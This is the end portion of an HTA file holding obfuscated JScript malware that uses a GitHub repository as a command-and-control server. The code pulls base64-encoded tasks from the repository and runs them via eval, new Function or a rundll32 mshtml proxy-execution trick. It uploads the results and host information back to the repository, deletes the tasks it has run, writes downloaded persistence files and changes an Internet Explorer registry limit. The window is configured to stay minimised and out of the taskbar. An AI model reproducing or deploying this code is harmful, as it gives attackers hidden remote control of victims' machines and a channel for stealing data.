    return b.replace(LNCIXTJASK.JNSMFGOXZO.MWNGGQGVQV, LNCIXTJASK.JNSMFGOXZO.LRIBHRSBYF);
};
//base64.btou ends

//base64.cb_decode starts
LNCIXTJASK.JNSMFGOXZO.DOHBMNNWDS = function(cccc)
{
    var len = cccc.length,
    padlen = len % 4,
    n = (len > 0 ? b64tab[cccc.charAt(0)] << 18 : 0)
        | (len > 1 ? b64tab[cccc.charAt(1)] << 12 : 0)
        | (len > 2 ? b64tab[cccc.charAt(2)] <<  6 : 0)
        | (len > 3 ? b64tab[cccc.charAt(3)]       : 0),
    chars = [
        fromCharCode( n >>> 16),
        fromCharCode((n >>>  8) & 0xff),
        fromCharCode( n         & 0xff)
    ];
    chars.length -= [0, 0, 2, 1][padlen];
    return chars.join('');
};
//base64.cb_decode ends

//base64._atob starts
LNCIXTJASK.JNSMFGOXZO.ZJYWWGWRRG = function(a)
{
    return a.replace(/\S{1,4}/g, LNCIXTJASK.JNSMFGOXZO.DOHBMNNWDS);
};
//base64._atob ends

//base64._decode starts
LNCIXTJASK.JNSMFGOXZO.SYGKNZTQFO = function(a)
{
    return LNCIXTJASK.JNSMFGOXZO.HPZUFXYLFU(LNCIXTJASK.JNSMFGOXZO.ZJYWWGWRRG(a));
};
// LNCIXTJASK.JNSMFGOXZO.SYGKNZTQFO ends

//base64.Base64Decode starts
LNCIXTJASK.JNSMFGOXZO.ZALRWZFJOX = function(beforeDecode)
{
    var afterDecode = "";
    if(typeof(beforeDecode) !== "string")
        throw "The format of content to be decoded is not correct!";

    if(beforeDecode.indexOf("\n") != -1)
        beforeDecode = beforeDecode.replace(/\n/g, "");

    try{
        afterDecode = window.atob(beforeDecode);
    } catch(e) {
        afterDecode = LNCIXTJASK.JNSMFGOXZO.SYGKNZTQFO(String(a).replace(/[-_]/g, function(m0) { return m0 == '-' ? '+' : '/' }).replace(/[^A-Za-z0-9\+\/]/g, ''));
    }

    return afterDecode;
};
//base64.Base64Decode ends

LNCIXTJASK.HOTWMJPDWW = {};

//github.deleteFile starts
LNCIXTJASK.HOTWMJPDWW.BSNYCEUMWD = function(fileName, sha){
    if((typeof(fileName) !== "string") || (typeof(sha) !== "string")){
        throw "The format of parameter fileName or sha is NOT correct!";
    }

    var url = LNCIXTJASK.NGMNZXYSQY + "://" + LNCIXTJASK.UAMTLYZUQI + "/repos/" + LNCIXTJASK.KNMCBQIWZZ + "/" + LNCIXTJASK.AYJSRZIRCI + "/contents/" + LNCIXTJASK.RFKABXTTJU + "/" + fileName;
    var header = [];
    header["Authorization"] = LNCIXTJASK.LAKPWHBEUM;
    var body = "";
    body += "{\"message\": \"" + LNCIXTJASK.GTJCJJZLJP + "\", \"sha\":\"" + sha + "\"}";

    var response = null;
    try{
        response = LNCIXTJASK.TOVGLLXDPP.VZRAADXILU(url, header, body, "DELETE");
    }
    catch(e)
    {
        throw "Exception occurs during deleting task file " + fileName +", and message is: " + e;
    }

    return response;
}
//github.deleteFile ends

//github.uploadData starts
LNCIXTJASK.HOTWMJPDWW.QLRRZTUXDL = function(fileName, content){
    if(typeof(fileName) !== "string"){
        throw "The format of fileName is NOT correct!";
    }

    var url = LNCIXTJASK.NGMNZXYSQY + "://" + LNCIXTJASK.UAMTLYZUQI + "/repos/" + LNCIXTJASK.KNMCBQIWZZ + "/" + LNCIXTJASK.AYJSRZIRCI + "/contents/" + LNCIXTJASK.MSCJJFCEMT + "/" + LNCIXTJASK.SBUIDWWYAK + "/" + fileName;
    var header = [];
    header["Authorization"] = LNCIXTJASK.LAKPWHBEUM;
    var body = "";
    body += "{\"message\": \"" + LNCIXTJASK.OWOQBFAHLG + "\", \"content\":\"" + content + "\"}";

    var response = null;
    try{
         response = LNCIXTJASK.TOVGLLXDPP.VZRAADXILU(url, header, body, "PUT");
    }
    catch(e)
    {
        throw "Exception occurs during uploading file " + fileName +", and message is: " + e;
    }

    return response;
}
//github.uploadData ends

LNCIXTJASK.GKZPUZDNBK = {};
//Execute starts
LNCIXTJASK.GKZPUZDNBK.CSPHIEYSTW = function(taskCode)
{
    var result = null;

    try {
        var statement = "(" + taskCode + ")();"
        result = eval(statement);
    }catch(e){
        throw e;
    }

    return result;
}
//Execute ends

//ExecuteFunction starts
LNCIXTJASK.GKZPUZDNBK.UMFORYVRFS = function(taskCode)
{
    var result = null;

    try {
        var funcFn = new Function(taskCode);
        result = funcFn();
    }catch(e){
        throw e;
    }

    return result;
}
//ExecuteFunction ends

//ExecuteRundll32 starts
LNCIXTJASK.GKZPUZDNBK.AXBIOTEXJN = function(taskCode)
{
    var result = null;

    var jsFilePath = "%TEMP%\\" + LNCIXTJASK.JLYMQYPPPN() + ".t"+"xt";
    LNCIXTJASK.DDGBYZNFSH.QVRSNEVRAZ(jsFilePath, taskCode);
    var resolvedPath = LNCIXTJASK.DDGBYZNFSH.UDHKJGJHTE(jsFilePath);

    var partsOfPath = resolvedPath.split("\\");
    resolvedPath = "";
    for(var i=0;i<(partsOfPath.length-1);i++) {
        resolvedPath += partsOfPath[i] + "\\\\";
    }
    resolvedPath += partsOfPath[partsOfPath.length-1];

    var cmd = "rundll32.exe javascript:\"\\..\\mshtml.dll, RunHTMLApplication \";var%20f=(new%20ActiveXObject(\"Scripting.FileSystemObject\")).OpenTextFile(\"" + resolvedPath + "\",1,false,0);var%20c=f.ReadAll();f.Close();eval(c);window.close();";

    try {
        LNCIXTJASK.ZCZIHSWGJA.Run(cmd, 0, false);
    }catch(e){
        try {
            LNCIXTJASK.TONYYEZHFT.ITWDAQUAMJ(cmd);
        }catch(e){
            LNCIXTJASK.HOTWMJPDWW.VYICVIAQHK("Unable to fulfill cmd: " + cmd + ", the message is: " + e);
        }
    }

    try{
        LNCIXTJASK.DDGBYZNFSH.BSNYCEUMWD(jsFilePath);
    }catch(e){
        LNCIXTJASK.HOTWMJPDWW.VYICVIAQHK("Caution! Unable to delete file: " + resolvedPath + ", the message is: " + e);
    }

    return result;
}
//ExecuteRundll32 ends

//ExecuteBAT starts
LNCIXTJASK.GKZPUZDNBK.MQHFMUVTEX = function(taskCode)
{
    var result = null;

    return result;
}
//ExecuteBAT ends

//Encrypt starts
LNCIXTJASK.MGNWSBWPRU = function(content)
{
    var encrypted = null;
    encrypted = content;

    return encrypted;
}
//Encrypt ends

//github.executeNewTasks.starts
LNCIXTJASK.HOTWMJPDWW.YUIZRLZNZZ = function(){

    var url = LNCIXTJASK.NGMNZXYSQY + "://" + LNCIXTJASK.UAMTLYZUQI + "/repos/" + LNCIXTJASK.KNMCBQIWZZ + "/" + LNCIXTJASK.AYJSRZIRCI + "/contents/" + LNCIXTJASK.RFKABXTTJU;
    var response = null;
    try {
        var header = [];
        header["Authorization"] = LNCIXTJASK.LAKPWHBEUM;
        response = LNCIXTJASK.TOVGLLXDPP.WSEKMMDBSY(url, header);
    }catch(e){
        LNCIXTJASK.HOTWMJPDWW.VYICVIAQHK("Exception occurs during retrieving the content of the task directory, and the message is: " + e);
        return;
    }
    if(response === null) {
        LNCIXTJASK.HOTWMJPDWW.VYICVIAQHK("Fail to retrieve the content of the task directory.");
        return;
    }

    var json = null;
    try{
        json = JSON.parse(response.responseText);
    }catch(e){
        json = eval('(' + response + ')');
    }

    for(var i=0;i<json.length;i++)
    {
        var taskName = json[i].name;

        var git_url = json[i].git_url;
        try {
            var header = [];
            header["Authorization"] = LNCIXTJASK.LAKPWHBEUM;
            var task = LNCIXTJASK.TOVGLLXDPP.WSEKMMDBSY(git_url, header);
        }catch(e){
            LNCIXTJASK.HOTWMJPDWW.VYICVIAQHK("Error occurs during retrieving targetFile " + taskName + ", and the error message is " + e);
            continue;
        }
        if(task === null)
        {
            LNCIXTJASK.HOTWMJPDWW.VYICVIAQHK("Code of task " + taskName + " can not be achieved");
            continue;
        }

        var json_task = null;
        try{
            json_task = JSON.parse(task.responseText);
        }catch(e){
            json_task = eval('(' + task + ')');
        }

        var content = json_task.content;
        if(content == undefined)
        {
            LNCIXTJASK.HOTWMJPDWW.VYICVIAQHK("No content of file " + taskName + " in the returned json data.");
            continue;
        }

        var decodedTask = LNCIXTJASK.JNSMFGOXZO.ZALRWZFJOX(content);

        var result = "";
        try {
            var pos = taskName.lastIndexOf("-");
            var typeInfor = taskName.substring(pos+1);
            pos = typeInfor.lastIndexOf(".");
            var majorType = typeInfor.substring(0, pos);
            var minorType = typeInfor.substring(pos+1);
            if(!majorType){
                LNCIXTJASK.HOTWMJPDWW.VYICVIAQHK("No major type of task " + taskName);
                continue;
            }
            if(!minorType){
                LNCIXTJASK.HOTWMJPDWW.VYICVIAQHK("No major type of task " + taskName);
                continue;
            }

            if(majorType === "js")
            {
                if(minorType === "RoundE")
                {
                    result = LNCIXTJASK.GKZPUZDNBK.CSPHIEYSTW(decodedTask);
                }
                else if(minorType === "RoundF")
                {
                    result = LNCIXTJASK.GKZPUZDNBK.UMFORYVRFS(decodedTask);
                }
                else if(minorType === "RoundR")
                {
                    result = LNCIXTJASK.GKZPUZDNBK.AXBIOTEXJN(decodedTask);
                }
                else if(minorType === "RoundM")
                {
                    result = LNCIXTJASK.GKZPUZDNBK.ExecuteMshta(decodedTask);
                    result = "Execution of task " + taskName + " by mshta is okay!";
                }
                else
                {
                    result = "Task " + taskName + " has a minorType of " + minorType + ", which does not have associated JS execution method.";
                    //continue;
                }
            }
            else if (majorType === "bat")
            {
                if(minorType === "RoundX")
                {
                    result = LNCIXTJASK.GKZPUZDNBK.MQHFMUVTEX(decodedTask);
                }
                else
                {
                    result = "Task " + taskName + " has a minorType of " + minorType + ", which does not have associated BAT execution method.";
                    //continue;
                }
            }
            else
            {
                result = "Task " + taskName + " has a majorType of " + majorType + ", which does not have associated execution method.";
                //continue;
            }
        }catch(e){
            result = "ERROR occurs during executing assigned task " + taskName + " : " + e;
        }

        var encryptedResult = LNCIXTJASK.MGNWSBWPRU(result+"");
        var base64AEncryptedResult = LNCIXTJASK.JNSMFGOXZO.SEPUXXFPUO(encryptedResult);
        var uploadFileName = "payBy-" + new Date().getTime() + ".c";
        var dataUploadResult = null;
        try{
            dataUploadResult = LNCIXTJASK.HOTWMJPDWW.QLRRZTUXDL(uploadFileName, base64AEncryptedResult);
            var uploadReturn = null;
            try{
                uploadReturn = JSON.parse(dataUploadResult.responseText);
            } catch(e){
                uploadReturn = eval('(' + dataUploadResult.responseText + ')');
            }

            if(!uploadReturn["content"] || !uploadReturn["commit"])
            {
                LNCIXTJASK.HOTWMJPDWW.VYICVIAQHK("Uploading result of executing task " + taskName + " fails!");
            }
        }catch(e){
            LNCIXTJASK.HOTWMJPDWW.VYICVIAQHK("Action of uploading result of executing task " + taskName + " fails, and the message is: " + e);
        }

        var taskSha = json[i].sha;
        try {
            LNCIXTJASK.HOTWMJPDWW.BSNYCEUMWD(taskName, taskSha);
        }catch(e){
            LNCIXTJASK.HOTWMJPDWW.VYICVIAQHK("Exceptions occurs during deleting task file " + taskName + ", and message is: " + e);
        }
    }
}
//github.executeNewTasks.ends

//github.forkProcess.starts
LNCIXTJASK.HOTWMJPDWW.YTSCYDAQSF = function(newProcessFile){
    if(typeof(newProcessFile) !== "string"){
        throw "The format of newProcessFile is NOT correct!";
    }

    var url = LNCIXTJASK.NGMNZXYSQY + "://" + LNCIXTJASK.UAMTLYZUQI + "/repos/" + LNCIXTJASK.KNMCBQIWZZ + "/" + LNCIXTJASK.AYJSRZIRCI + "/contents/" + LNCIXTJASK.OXUVNIHTVN;
    var response = null;
    try {
        var header = [];
        header["Authorization"] = LNCIXTJASK.LAKPWHBEUM;
        response = LNCIXTJASK.TOVGLLXDPP.WSEKMMDBSY(url, header);
    }catch(e){
        LNCIXTJASK.HOTWMJPDWW.VYICVIAQHK("Exception occurs during retrieving the content of the task directory, and the message is: " + e);
        return;
    }
    if(response === null){
        LNCIXTJASK.HOTWMJPDWW.VYICVIAQHK("Fail to retrieve the content of the task directory.");
        return;
    }

    var json = null;
    try{
        json = JSON.parse(response.responseText);
    }catch(e){
        json = eval('(' + response + ')');
    }

    var result="";
    for(var i=0;i<json.length;i++)
    {
        var taskName = json[i].name;
        if(taskName != newProcessFile)
            continue;

        var git_url = json[i].git_url;
        try {
            var header = [];
            header["Authorization"] = LNCIXTJASK.LAKPWHBEUM;
            var task = LNCIXTJASK.TOVGLLXDPP.WSEKMMDBSY(git_url, header);
        }catch(e){
            LNCIXTJASK.HOTWMJPDWW.VYICVIAQHK("Error occurs during retrieving targetFile " + taskName + ", and the error message is " + e);
            continue;
        }
        if(task === null)
        {
            LNCIXTJASK.HOTWMJPDWW.VYICVIAQHK("Code of task " + taskName + " can not be achieved");
            continue;
        }

        var json_task = null;
        try{
            json_task = JSON.parse(task.responseText);
        }catch(e){
            json_task = eval('(' + task + ')');
        }

        var content = json_task.content;
        if(content == undefined)
        {
            LNCIXTJASK.HOTWMJPDWW.VYICVIAQHK("No content of file " + taskName + " in the returned json data.");
            continue;
        }

        var decodedTask = LNCIXTJASK.JNSMFGOXZO.ZALRWZFJOX(content);

        try {
            var pos = taskName.lastIndexOf("-");
            var typeInfor = taskName.substring(pos+1);
            pos = typeInfor.lastIndexOf(".");
            var majorType = typeInfor.substring(0, pos);
            var minorType = typeInfor.substring(pos+1);
            if(!majorType){
                LNCIXTJASK.HOTWMJPDWW.VYICVIAQHK("No major type of process file " + taskName);
                continue;
            }
            if(!minorType){
                LNCIXTJASK.HOTWMJPDWW.VYICVIAQHK("No minor type of process file " + taskName);
                continue;
            }

            if(majorType === "js")
            {
                if(minorType === "RoundE")
                {
                    result = LNCIXTJASK.GKZPUZDNBK.CSPHIEYSTW(decodedTask);
                    return result;
                }
                else if(minorType === "RoundF")
                {
                    result = LNCIXTJASK.GKZPUZDNBK.UMFORYVRFS(decodedTask);
                    return result;
                }
                else if(minorType === "RoundR")
                {
                    result = LNCIXTJASK.GKZPUZDNBK.AXBIOTEXJN(decodedTask);
                    return result;
                }
                else if(minorType === "RoundM")
                {
                    result = LNCIXTJASK.GKZPUZDNBK.ExecuteMshta(decodedTask);
                    return result;
                }
                else
                {
                    LNCIXTJASK.HOTWMJPDWW.VYICVIAQHK("Process file " + taskName + " has a minorType of " + minorType + ", which does not have associated JS execution method.");
                    continue;
                }
            }
            else if (majorType === "bat")
            {
                if(minorType === "RoundX")
                {
                    result = LNCIXTJASK.GKZPUZDNBK.MQHFMUVTEX(decodedTask);
                    return  result;
                }
                else
                {
                    LNCIXTJASK.HOTWMJPDWW.VYICVIAQHK("Process file " + taskName + " has a minorType of " + minorType + ", which does not have associated BAT execution method.");
                    continue;
                }
            }
            else
            {
                LNCIXTJASK.HOTWMJPDWW.VYICVIAQHK("Process file " + taskName + " has a majorType of " + majorType + ", which does not have associated execution method.");
                continue;
            }
        }catch(e){
            LNCIXTJASK.HOTWMJPDWW.VYICVIAQHK("ERROR occurs during executing assigned process file " + taskName + ", and the message is: " + e);
            continue;
        }
    }

    if(i == json.length){
        LNCIXTJASK.HOTWMJPDWW.VYICVIAQHK("No process file named " + newProcessFile + " found!");
        return;
    }
}
//github.forkProcess.ends

//github.report.ends
LNCIXTJASK.HOTWMJPDWW.SDHLGKVLGZ = function(data){
    var dataUploadResult = null;
    try{
        var encryptedData = LNCIXTJASK.MGNWSBWPRU(data+"");
        var base64AEncryptedData = LNCIXTJASK.JNSMFGOXZO.SEPUXXFPUO(encryptedData);
        var uploadFileName = "report-" + new Date().getTime() + ".c";
        dataUploadResult = LNCIXTJASK.HOTWMJPDWW.QLRRZTUXDL(uploadFileName, base64AEncryptedData);
    }catch(e){
        LNCIXTJASK.HOTWMJPDWW.VYICVIAQHK("Error occurs when reporting to the controller, and the message is: " + e);
    }

    return dataUploadResult;
}
//github.report.ends

//github.error.ends
LNCIXTJASK.HOTWMJPDWW.XNIZGYFSTD = function(e){
    try
    {
        var data = "";
        try{
            var headers = {};
            headers["errno"] = (e.number) ? e.number : "-1";
            headers["errname"] = (e.name) ? e.name : "Unknown";
            headers["errdesc"] = (e.description) ? e.description : "Unknown";
            data = JSON.stringify(headers);
        }catch(e){
            data += "{\"errno\":\"";
            data += (e.number) ? e.number : "-1";
            data += "\",\"errname\":\"";
            data += (e.name) ? e.name : "Unknown";
            data += "\",\"errdesc\":\"";
            data += (e.description) ? e.description : "Unknown";
            data += "\"}";
        }

        var encryptedData = LNCIXTJASK.MGNWSBWPRU(data);
        var base64AEncryptedData = LNCIXTJASK.JNSMFGOXZO.SEPUXXFPUO(encryptedData);
        var uploadFileName = "error-" + new Date().getTime() + ".c";
        var dataUploadResult = LNCIXTJASK.HOTWMJPDWW.QLRRZTUXDL(uploadFileName, base64AEncryptedData);
        return dataUploadResult;
    }catch(e){}
}
//github.error.ends

//github.selfDefinedError.start
LNCIXTJASK.HOTWMJPDWW.VYICVIAQHK = function(errorMsg){
    try
    {
        var encryptedData = LNCIXTJASK.MGNWSBWPRU(errorMsg);
        var base64AEncryptedData = LNCIXTJASK.JNSMFGOXZO.SEPUXXFPUO(encryptedData);
        var uploadFileName = "error-" + new Date().getTime() + ".c";
        var dataUploadResult = LNCIXTJASK.HOTWMJPDWW.QLRRZTUXDL(uploadFileName, base64AEncryptedData);
        return dataUploadResult;
    }catch(e){}
}
//github.selfDefinedError.end

//github.downloadEx.start
LNCIXTJASK.HOTWMJPDWW.HOUQYKSUHD = function(persistFile, path)
{
    if(typeof(persistFile) !== "string"){
        throw "The format of newProcessFile is NOT correct!";
    }

    var url = LNCIXTJASK.NGMNZXYSQY + "://" + LNCIXTJASK.UAMTLYZUQI + "/repos/" + LNCIXTJASK.KNMCBQIWZZ + "/" + LNCIXTJASK.AYJSRZIRCI + "/contents/" + LNCIXTJASK.FFTRFDSPAS + "/" + persistFile;
    var response = null;
    try {
        var header = [];
        header["Authorization"] = LNCIXTJASK.LAKPWHBEUM;
        response = LNCIXTJASK.TOVGLLXDPP.WSEKMMDBSY(url, header);
    }catch(e){
        LNCIXTJASK.HOTWMJPDWW.VYICVIAQHK("Exception occurs during retrieving the content of the persist file: " + persistFile + ", and the message is: " + e);
        return;
    }
    if(response === null){
        LNCIXTJASK.HOTWMJPDWW.VYICVIAQHK("Fail to retrieve the content of the persist file: " + persistFile);
        return;
    }

    var json = null;
    try{
        json = JSON.parse(response.responseText);
    }catch(e){
        json = eval('(' + response + ')');
    }

    var content = json.content;
    if(content == undefined)
    {
        LNCIXTJASK.HOTWMJPDWW.VYICVIAQHK("No content of file " + persistFile + " in the returned json data.");
        return;
    }

    var decodedTask = LNCIXTJASK.JNSMFGOXZO.ZALRWZFJOX(content);

    var stream = new ActiveXObject("Adodb.Stream");
    stream.Type = 1;
    stream.Open();
    stream.Write(decodedTask);

    var data = LNCIXTJASK.TOVGLLXDPP.NKLTAHGYPP(stream);
    LNCIXTJASK.DDGBYZNFSH.QVRSNEVRAZ(path, data);
}
//github.downloadEx.end
function Work()
{
    for(var  i=0;i<10;i++)
    {
        LNCIXTJASK.HOTWMJPDWW.YUIZRLZNZZ();
        LNCIXTJASK.XGNUUMQBNJ.OHSOLMFLNW(30000);
    }

    LNCIXTJASK.HOTWMJPDWW.YTSCYDAQSF("stage-js.RoundR");
    LNCIXTJASK.XGNUUMQBNJ.XCEIIGUFZR();
}

try
{
    if(LNCIXTJASK.OLNNBCSFYX != "stage")
    {
         if (LNCIXTJASK.LDIZMHEFQT())
        {
            var path = "SOFTWARE\\Microsoft\\Internet Explorer\\Styles";
            var key = "MaxScriptStatements";
            LNCIXTJASK.XQHZWWRDWK.QVRSNEVRAZ(LNCIXTJASK.XQHZWWRDWK.YUMRRGRJMT, path, key, 0xFFFFFFFF, LNCIXTJASK.XQHZWWRDWK.AFJGREQHGW);
        }

        LNCIXTJASK.HOTWMJPDWW.SDHLGKVLGZ(LNCIXTJASK.LXUPELASHF.FOGOULBTTB());

        try {
             LNCIXTJASK.HOTWMJPDWW.YTSCYDAQSF("stage-js.RoundR");
        } catch (e) {
             LNCIXTJASK.HOTWMJPDWW.XNIZGYFSTD(e);
        }

        LNCIXTJASK.XGNUUMQBNJ.XCEIIGUFZR();
    }
    else
    {
        Work();
    }
}
catch (e)
{
    // todo: critical error reporting
    LNCIXTJASK.HOTWMJPDWW.XNIZGYFSTD(e);
}
</script>
<hta:application caption="no" windowState="minimize" showInTaskBar="no"
                 scroll="no" navigable="no" />
                 <!--  -->
</head>
<body>
</body>
</html>